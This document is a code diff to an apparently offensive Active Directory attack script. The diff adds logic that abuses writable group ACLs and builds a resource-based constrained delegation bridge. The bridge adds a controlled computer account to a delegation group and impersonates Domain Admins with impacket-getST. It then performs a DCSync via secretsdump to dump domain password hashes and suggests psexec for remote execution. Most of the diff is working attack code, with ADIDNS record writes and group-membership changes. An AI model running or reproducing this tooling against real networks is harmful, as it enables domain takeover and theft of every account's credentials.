@@ -22,7 +22,7 @@ set -o pipefail
 # ===========================================================================
 #  METADATA
 # ===========================================================================
-readonly VERSION="1.55.2"
+readonly VERSION="1.55.3"
 readonly AUTHOR="c4sh3r"
 KERBRUTE_BIN="${KERBRUTE_BIN:-/opt/kerbrute}"
 KERBRUTE_RC4_DEAD=0               # set when the DC rejects RC4 (KDC_ERR_ETYPE_NOSUPP) → kerbrute unusable, spray via netexec
@@ -212,6 +212,8 @@ declare -A ASSESS_N=()            # identity (lc) → times assessed; hard loop 
 declare -A CHAIN_FROM=()          # identity (lc) → the identity we pivoted FROM to reach it
 declare -A CHAIN_VIA=()           # identity (lc) → the technique that yielded it
 declare -A ABUSED_GLOBAL=()       # "target:right" already abused (across phases), fire once
+declare -A GROUP_ABUSE_DONE=()    # "actor|group" membership action already handled across ACL/BH phases
+declare -A RBCD_GROUP_DONE=()     # "actor|group|host" AllowedToAct bridge already attempted
 declare -A OU_DESCENDANT_DONE=()   # "actor|ou-dn" → inheritable descendant takeover attempted
 declare -A ALTSECID_DONE=()        # "actor|target" → explicit certificate mapping attempted
 declare -A COMP_SILVER_DONE=()    # computer (lc) → takeover-via-silver-ticket already attempted
@@ -2219,7 +2221,7 @@ for fn,doc in data.items():
         props=o.get("Properties") or {}
         sam=short(props.get("samaccountname") or props.get("name") or oid)
         dn=props.get("distinguishedname") or ""
-        objs.append((sam,typ,dn,o.get("Aces") or []))
+        objs.append((sam,typ,dn,o.get("Aces") or [],oid,o))
         if typ=="Group":
             groups.append((oid,[m.get("ObjectIdentifier","") for m in (o.get("Members") or [])]))
         if owner in (sam.lower(), short(props.get("name","")).lower()):
@@ -2249,13 +2251,31 @@ ABUSABLE={"GenericAll","GenericWrite","WriteDacl","WriteOwner","Owns","AddMember
           "ForceChangePassword","AllExtendedRights","AddKeyCredentialLink","WriteSPN","AddAllowedToAct",
           "ReadGMSAPassword","ReadLAPSPassword"}
 seen=set()
-for sam,typ,dn,aces in objs:
+for sam,typ,dn,aces,oid,raw in objs:
     for a in aces:
         r=a.get("RightName")
         if a.get("PrincipalSID","") in mysids and r in ABUSABLE:
             k=(r,sam,typ)
             if k in seen: continue
             seen.add(k); print("%s\t%s\t%s\t%s"%(r,sam,typ,dn))
+# RBCD graph edges have an execution prerequisite BloodHound's path view does not
+# express: the AllowedToAct actor needs an SPN. If this user can write membership
+# of an AllowedToAct GROUP, a controlled computer account is the correct member to
+# add (not the current SPN-less user). Emit a synthetic edge for that bridge.
+group_writes={}
+member_rights={"GenericAll","GenericWrite","AddMember"}
+for sam,typ,dn,aces,oid,raw in objs:
+    if typ!="Group": continue
+    if any(a.get("PrincipalSID","") in mysids and a.get("RightName") in member_rights for a in aces):
+        group_writes[oid]=sam
+for sam,typ,dn,aces,oid,raw in objs:
+    if typ!="Computer": continue
+    for actor in (raw.get("AllowedToAct") or []):
+        gid=actor.get("ObjectIdentifier","")
+        if gid in group_writes:
+            k=("RBCDViaGroup",sam,group_writes[gid])
+            if k in seen: continue
+            seen.add(k); print("RBCDViaGroup\t%s\tComputer\t%s"%(sam,group_writes[gid]))
 PYEOF
 }
 
@@ -2266,9 +2286,16 @@ phase_bh_abuse() {
     [[ -z "$edges" ]] && return
     section "BLOODHOUND-DRIVEN ABUSE · ${USER}'s outbound rights (graph parity)"
     [[ "$DO_ABUSE" != "1" ]] && info "  (report-only; --abuse to act on these BloodHound edges)"
-    local right tgt cls dn dk
+    local right tgt cls dn dk gkey
     while IFS=$'\t' read -r right tgt cls dn; do
         [[ -z "$right" || -z "$tgt" ]] && continue
+        # Several BloodHound rights collapse to the exact same group-member write.
+        # The writable-ACL phase may also have performed it already, so suppress the
+        # duplicate edge before printing another prompt/command.
+        if [[ "$cls" == "Group" && "$right" =~ ^(AddMember|AddSelf|GenericWrite|GenericAll|AllExtendedRights|WriteDacl|WriteOwner|Owns)$ ]]; then
+            gkey="$(_group_membership_key "$tgt")"
+            [[ -n "${GROUP_ABUSE_DONE[$gkey]:-}" ]] && continue
+        fi
         dk="${tgt,,}:${right,,}"
         [[ -n "${ABUSED_GLOBAL[$dk]:-}" ]] && continue   # already handled (here or in the ACL phase)
         ABUSED_GLOBAL["$dk"]=1
@@ -2279,6 +2306,7 @@ phase_bh_abuse() {
             AddKeyCredentialLink)  _abuse_shadowcred "$tgt" ;;
             WriteSPN)              _abuse_writespn "$tgt" ;;
             AddAllowedToAct)       _abuse_rbcd "$tgt" ;;
+            RBCDViaGroup)          _abuse_group_rbcd_bridge "$dn" "$tgt" ;;
             ForceChangePassword)   _abuse_user "$tgt" ;;
             ReadGMSAPassword|ReadLAPSPassword) info "  → secret read handled in the Secrets phase" ;;
             GenericWrite)
@@ -2898,10 +2926,14 @@ phase_rodc_abuse() {
     if   [[ -n "$KERB_TICKET" ]]; then rodc=$(KRB5CCNAME="$KERB_TICKET" ldapsearch -LLL -Y GSSAPI -H "ldap://${DC_FQDN:-$DC_IP}" -b "$base" "$filt" "${attrs[@]}" 2>/dev/null)
     elif [[ -n "$PASS" ]];       then rodc=$(ldapsearch -LLL -x -H "ldap://$DC_IP" -D "${USER}@${DOMAIN}" -w "$PASS" -b "$base" "$filt" "${attrs[@]}" 2>/dev/null)
     fi
-    [[ -z "$rodc" ]] && { info "No RODC in this domain → RODC abuse N/A"; return; }
+    # ldapsearch can return only a referral (not an entry) and still leave a
+    # non-empty string. Require the identifying attribute of a real RODC so a
+    # ForestDnsZones referral cannot produce a blank "RODC present" finding.
+    local rname rkt
+    rname=$(grep -oiP '^sAMAccountName:\s*\K\S+' <<<"$rodc" | head -1) || true
+    [[ -z "$rname" ]] && { info "No RODC in this domain → RODC abuse N/A"; return; }
 
     section "RODC ABUSE · read-only DC key abuse"
-    local rname rkt; rname=$(grep -oiP 'sAMAccountName:\s*\K\S+' <<<"$rodc" | head -1)
     rkt=$(grep -oiP 'msDS-KrbTgtLink:\s*CN=\K[^,]+' <<<"$rodc" | head -1)
     loot "RODC present: ${C_BOLD}${rname}${C_RESET}  (its krbtgt: ${rkt:-krbtgt_<RID>})"
     grep -oiP 'msDS-RevealOnDemandGroup:\s*\K.*' <<<"$rodc" | while read -r g; do detail "      Allowed-to-cache: $g"; done
@@ -4033,7 +4065,9 @@ phase_acl() {
 # child objects. This is a domain-wide primitive; run it once and track rollback.
 _abuse_adidns() {
     local zone="$1" record="${ADIDNS_RECORD:-wpad}" ba; mapfile -t ba < <(bloody_args)
-    local key="${zone,,}:${record,,}"
+    # bloodyAD resolves the AD-integrated domain zone itself. ForestDnsZones and
+    # DomainDnsZones ACL listings therefore used to launch the same write twice.
+    local key="${DOMAIN,,}:${record,,}"
     [[ -n "${ADIDNS_DONE[$key]:-}" ]] && { info "  ADIDNS ${record} already attempted for ${zone} in this run"; return; }
     ADIDNS_DONE["$key"]=1
 
@@ -4051,7 +4085,11 @@ _abuse_adidns() {
     abuse_confirm "  Add ADIDNS record '${record}' → ${ip}?" || return 1
     run "bloodyAD ${ba[*]} add dnsRecord '$record' '$ip'"
     local out; out=$(bloodyAD "${ba[@]}" add dnsRecord "$record" "$ip" 2>&1); echo "$out" | tee -a "$LOGFILE"
-    if grep -qiE 'success|added|created|written|already' <<<"$out"; then
+    if grep -qiE 'entryAlreadyExists|attributeOrValueExists|already exists' <<<"$out"; then
+        loot "★ ADIDNS record already exists: ${record}.${DOMAIN} (leaving it untouched)"
+        info "  Existing records are not registered for rollback because this run did not create them."
+        return 0
+    elif grep -qiE 'success|added|created|written' <<<"$out"; then
         loot "★ ADIDNS record available: ${record}.${DOMAIN} → ${ip}"
         rb_record "Added ADIDNS record $record -> $ip" "bloodyAD ${ba[*]} remove dnsRecord '$record'"
         info "  Pair this with relay/coercion or NetNTLM capture; the record is global for later queued identities."
@@ -4281,45 +4319,80 @@ _badsuccessor_mark_and_pull() {
     return 1
 }
 
+# Stable identity for a group-membership action. ACL enumeration and BloodHound
+# frequently expose the same effective write as GenericWrite + AddSelf + member.
+_group_membership_key() {
+    local grp="$1" g="${1%%,*}"
+    [[ "$g" == *=* ]] && g="${g#*=}"
+    printf '%s|%s' "${USER,,}" "${g,,}"
+}
+
+# Re-ticket after a group membership is known to be present. A stale TGT keeps the
+# old PAC and makes the next graph/LDAP pass look as if the abuse had no effect.
+_group_refresh_pac() {
+    local grp="$1" _g="${1%%,*}"; [[ "$_g" == *=* ]] && _g="${_g#*=}"
+    local _rqk="${USER,,}|${_g,,}"
+    if [[ -n "${REQUEUED_SELF[$_rqk]:-}" ]]; then
+        info "  (already re-assessed ${USER} for group '${grp}' — not looping)"
+        return
+    fi
+    REQUEUED_SELF["$_rqk"]=1
+    if [[ -n "$PASS$HASH" ]]; then
+        unset "SEEN_CREDS[$(cred_key "$USER" "$PASS" "$HASH")]"
+        # Only discard the cache when we can mint its replacement. Ticket-only
+        # pivots must retain their one usable credential.
+        [[ -n "$KERB_TICKET" ]] && rm -f "$KERB_TICKET" "$OUTDIR/$(_safe_name "$USER").ccache" 2>/dev/null
+        KERB_TICKET=""; unset KRB5CCNAME
+        queue_cred "$USER" "$PASS" "$HASH" "re-auth after joining '$grp' (fresh PAC)"
+    else
+        warn "  membership in '$grp' is present but only a ticket is held → retain it; obtain the account secret for a fresh PAC"
+    fi
+}
+
 # Add the current user to a group we can write (with rollback)
 _abuse_group() {
-    local grp="$1"; local ba; mapfile -t ba < <(bloody_args)
+    local grp="$1" action_key; action_key="$(_group_membership_key "$grp")"
+    if [[ -n "${GROUP_ABUSE_DONE[$action_key]:-}" ]]; then
+        info "  Group membership action already handled: ${USER} → '${grp}'"
+        return 0
+    fi
+    GROUP_ABUSE_DONE["$action_key"]=1
+
+    local ba; mapfile -t ba < <(bloody_args)
     [[ "$DO_ABUSE" != "1" ]] && { info "  (report-only; run with --abuse to add $USER to '$grp')"; return; }
     abuse_confirm "  Add ${USER} to group '${grp}'?" || return
+
+    local -a benv=()
+    [[ "$KERBEROS" == "1" && -n "$KERB_TICKET" ]] && benv=(env "KRB5CCNAME=$KERB_TICKET")
+
+    # Idempotent preflight: an earlier phase/run may already have completed the
+    # abuse. Treat that state as achieved instead of invoking bloodyAD and turning
+    # ERROR_MEMBER_IN_ALIAS into a misleading permissions warning.
+    local memberships="" group_cn="${grp%%,*}"
+    [[ "$group_cn" == *=* ]] && group_cn="${group_cn#*=}"
+    memberships=$("${benv[@]}" bloodyAD "${ba[@]}" get object "$USER" --attr memberOf 2>&1) || true
+    printf '%s\n' "$memberships" >>"$LOGFILE"
+    if grep -Fqi "CN=${group_cn}," <<<"$memberships"; then
+        loot "★ ${USER} is already a member of '${grp}' — abuse state is available"
+        _group_refresh_pac "$grp"
+        return 0
+    fi
+
     run "bloodyAD ${ba[*]} add groupMember '$grp' '$USER'"
-    if bloodyAD "${ba[@]}" add groupMember "$grp" "$USER" 2>&1 | tee -a "$LOGFILE" | grep -qi 'added\|success'; then
+    local addout="" addrc=0
+    addout=$("${benv[@]}" bloodyAD "${ba[@]}" add groupMember "$grp" "$USER" 2>&1) || addrc=$?
+    printf '%s\n' "$addout" | tee -a "$LOGFILE"
+    if (( addrc == 0 )) || grep -qiE 'added|success' <<<"$addout"; then
         loot "★ Added ${USER} to '${grp}' — re-enumerating with new privileges"
         rb_record "Added $USER to group $grp" \
                   "bloodyAD ${ba[*]} remove groupMember '$grp' '$USER'"
-        # New group membership only lands in the Kerberos PAC with a FRESH ticket, so
-        # re-auth + re-enumerate to expose the edges the group unlocks (GenericWrite,
-        # AddSelf-to-service, …). Key the loop-guard per (user, GROUP) — NOT per user —
-        # so a MULTI-HOP chain works: join group A → re-assess → that reveals AddSelf to
-        # group B → join B → re-assess again. Keying per-user would cap it at one hop
-        # and stall exactly the precomputer→group→GenericWrite→AddSelf→privesc chain.
-        # The same group can't re-trigger (its key is set) → no infinite loop.
-        # Canonicalize the group name (strip CN=/DN, trailing $, lowercase) so the dedup
-        # key is stable whether the caller passed a sAMAccountName, a CN or a full DN —
-        # otherwise the same group in two forms re-queues forever.
-        local _g="${grp,,}"; _g="${_g##*cn=}"; _g="${_g%%,*}"; _g="${_g%\$}"
-        local _rqk="${USER,,}|${_g}"
-        if [[ -z "${REQUEUED_SELF[$_rqk]:-}" ]]; then
-            REQUEUED_SELF["$_rqk"]=1
-            unset "SEEN_CREDS[$(cred_key "$USER" "$PASS" "$HASH")]"
-            # Drop the stale TGT/ccache so phase_validate_creds mints a new one whose PAC
-            # carries the just-added group (otherwise the new edges stay invisible).
-            rm -f "$KERB_TICKET" "$OUTDIR/$(_safe_name "$USER").ccache" 2>/dev/null
-            KERB_TICKET=""; unset KRB5CCNAME
-            if [[ -n "$PASS$HASH" ]]; then
-                queue_cred "$USER" "$PASS" "$HASH" "re-auth after joining '$grp' (fresh PAC)"
-            else
-                warn "  added to '$grp' but only a ticket is held (no pass/hash) → re-run with the account's secret to pick up the new PAC"
-            fi
-        else
-            info "  (already re-assessed ${USER} for group '${grp}' — not looping)"
-        fi
+        _group_refresh_pac "$grp"
+    elif grep -qiE 'entryAlreadyExists|attributeOrValueExists|ERROR_MEMBER_IN_ALIAS|already (a )?member' <<<"$addout"; then
+        loot "★ ${USER} is already a member of '${grp}' — abuse state is available"
+        _group_refresh_pac "$grp"
     else
-        warn "Failed to add to '$grp' (rights may not cover membership)"
+        warn "Failed to add to '$grp' (bloodyAD exit ${addrc})"
+        grep -Ei 'LDAPModifyException|Reason:|error|denied|insufficient|Traceback' <<<"$addout" | tail -3 | while read -r line; do detail "      $line"; done
     fi
 }
 
@@ -4623,6 +4696,117 @@ _abuse_shadowcred() {
         fi
     fi
     warn "Shadow Credentials did not yield a hash for $target"; return 1
+}
+
+# Return one controlled computer credential as machine<TAB>password<TAB>hash.
+# Processed credentials remain encoded in SEEN_CREDS; pending pre2k/gMSA machines
+# may still be in CRED_QUEUE when the user that can bridge the RBCD group is assessed.
+_controlled_computer_cred() {
+    local target="${1,,}" k ku kp kh q
+    for k in "${!SEEN_CREDS[@]}"; do
+        IFS='|' read -r ku kp kh <<<"$k"
+        [[ "$ku" == *\$ && "${ku,,}" != "$target" && -n "$kp$kh" && "$kp" != "*" && "$kh" != "*" ]] || continue
+        printf '%s\t%s\t%s\n' "$ku" "$kp" "$kh"; return 0
+    done
+    for q in "${CRED_QUEUE[@]}"; do
+        IFS='|' read -r ku kp kh <<<"$q"
+        [[ "$ku" == *\$ && "${ku,,}" != "$target" && -n "$kp$kh" && "$kp" != "*" && "$kh" != "*" ]] || continue
+        printf '%s\t%s\t%s\n' "$ku" "$kp" "$kh"; return 0
+    done
+    return 1
+}
+
+# BloodHound bridge: the current user can write a GROUP that is already present in
+# a computer's AllowedToAct descriptor. An SPN-less user cannot execute S4U2Self;
+# add a controlled computer (pre2k/gMSA/etc.) to that group, then use the machine's
+# fresh TGT as the real RBCD actor.
+_abuse_group_rbcd_bridge() {
+    local grp="$1" target="$2" key="${USER,,}|${grp,,}|${target,,}"
+    [[ -n "${RBCD_GROUP_DONE[$key]:-}" ]] && return 0
+    RBCD_GROUP_DONE["$key"]=1
+    [[ "$DO_ABUSE" == "1" ]] || { info "  RBCD bridge: add a controlled computer to '$grp' → impersonate on '$target' (--abuse to act)"; return; }
+    have impacket-getST || { warn "  RBCD bridge found, but impacket-getST is unavailable"; return 1; }
+
+    local machine mp mh
+    IFS=$'\t' read -r machine mp mh < <(_controlled_computer_cred "$target")
+    if [[ -z "$machine" ]]; then
+        warn "  RBCD bridge ${grp} → ${target} needs a controlled computer account with a password/hash"
+        info "  Run/retain the pre2k or gMSA pivot first; an ordinary user without an SPN cannot be the S4U actor."
+        return 1
+    fi
+
+    local ba; mapfile -t ba < <(bloody_args)
+    local -a benv=()
+    [[ "$KERBEROS" == "1" && -n "$KERB_TICKET" ]] && benv=(env "KRB5CCNAME=$KERB_TICKET")
+    local gout="" member_cn="${machine%\$}"
+    gout=$("${benv[@]}" bloodyAD "${ba[@]}" get object "$grp" --attr member 2>&1) || true
+    printf '%s\n' "$gout" >>"$LOGFILE"
+    if grep -Fqi "CN=${member_cn}," <<<"$gout"; then
+        loot "★ RBCD actor ${machine} is already in '${grp}'"
+    else
+        abuse_confirm "  Add controlled computer ${machine} to '${grp}' for RBCD on '${target}'?" || return 1
+        run "bloodyAD ${ba[*]} add groupMember '$grp' '$machine'"
+        local addout="" addrc=0
+        addout=$("${benv[@]}" bloodyAD "${ba[@]}" add groupMember "$grp" "$machine" 2>&1) || addrc=$?
+        printf '%s\n' "$addout" | tee -a "$LOGFILE"
+        if (( addrc == 0 )) || grep -qiE 'added|success' <<<"$addout"; then
+            loot "★ Added SPN-bearing actor ${machine} to AllowedToAct group '${grp}'"
+            rb_record "Added $machine to RBCD group $grp" \
+                      "bloodyAD ${ba[*]} remove groupMember '$grp' '$machine'"
+        elif grep -qiE 'entryAlreadyExists|attributeOrValueExists|ERROR_MEMBER_IN_ALIAS|already (a )?member' <<<"$addout"; then
+            loot "★ RBCD actor ${machine} is already in '${grp}'"
+        else
+            warn "  Could not add ${machine} to RBCD group '${grp}' (bloodyAD exit ${addrc})"
+            grep -Ei 'LDAPModifyException|Reason:|error|denied|insufficient' <<<"$addout" | tail -3 | while read -r line; do detail "      $line"; done
+            return 1
+        fi
+    fi
+
+    # getST obtains a fresh machine TGT internally, so its PAC includes the group
+    # membership even when the machine had been assessed before this ACL change.
+    local host="${target%\$}" fqdn="${target%\$}.${DOMAIN}" admin_out=""
+    admin_out=$("${benv[@]}" bloodyAD "${ba[@]}" get object 'Domain Admins' --attr member 2>/dev/null) || true
+    local -a admins=() ordered=() dcreds=()
+    mapfile -t admins < <(grep -i '^member:' <<<"$admin_out" | sed 's/^[^:]*:[[:space:]]*//' | tr ';' '\n' | sed -n 's/^[[:space:]]*CN=\([^,]*\).*/\1/p')
+    local adm
+    for adm in "${admins[@]}"; do [[ "${adm,,}" != "administrator" ]] && ordered+=("$adm"); done
+    ordered+=(Administrator)  # built-in may be denied network logon; deliberately last
+    if [[ -n "$mh" ]]; then dcreds=(-hashes ":${mh##*:}" "$DOMAIN/$machine")
+    else dcreds=("$DOMAIN/$machine:$mp"); fi
+
+    for adm in "${ordered[@]}"; do
+        info "  RBCD S4U: ${machine} → ${adm}@cifs/${fqdn}"
+        local stout="" stfile="" cc=""
+        stout=$(cd "$OUTDIR" && env -u KRB5CCNAME impacket-getST -spn "cifs/${fqdn}" \
+                    -impersonate "$adm" "${dcreds[@]}" -dc-ip "$DC_IP" 2>&1) || true
+        printf '%s\n' "$stout" | tee -a "$LOGFILE"
+        stfile=$(grep -oiP 'Saving ticket in \K\S+\.ccache' <<<"$stout" | tail -1)
+        [[ -n "$stfile" && -f "$OUTDIR/$stfile" ]] || continue
+        cc="$OUTDIR/rbcd_$(_safe_name "$adm")_$(_safe_name "$host").ccache"
+        mv -f "$OUTDIR/$stfile" "$cc"
+        loot "★ RBCD service ticket → $(basename "$cc")"
+
+        if [[ "${host,,}" == "${DC_HOST,,}" || "${fqdn,,}" == "${DC_FQDN,,}" ]]; then
+            have impacket-secretsdump || { warn "  Ticket obtained, but impacket-secretsdump is unavailable"; return 0; }
+            local sdout=""
+            sdout=$(KRB5CCNAME="$cc" impacket-secretsdump -k -no-pass "$fqdn" -dc-ip "$DC_IP" \
+                        -just-dc -outputfile "$OUTDIR/dcsync_rbcd" 2>&1) || true
+            printf '%s\n' "$sdout" | tee -a "$LOGFILE"
+            if grep -qE ':::' <<<"$sdout"; then
+                printf '%s\n' "$sdout" >"$OUTDIR/secretsdump.txt"
+                DOMAIN_DUMPED=1; IS_DC_ADMIN=1; OWNED_ADMIN["${adm,,}"]=1
+                note_cred_source "$adm" "RBCD via $machine in $grp"
+                loot "★★★★★ RBCD → ${adm} → DCSYNC SUCCESSFUL ★★★★★"
+                return 0
+            fi
+            warn "  ${adm} ticket was issued but DCSync/logon failed; trying another Domain Admin"
+        else
+            loot "  → KRB5CCNAME=$cc impacket-psexec -k -no-pass $fqdn"
+            return 0
+        fi
+    done
+    warn "  RBCD group bridge was installed, but no impersonated admin produced a usable service session"
+    return 1
 }
 
 # Resource-Based Constrained Delegation: write msDS-AllowedToActOnBehalfOf… on a
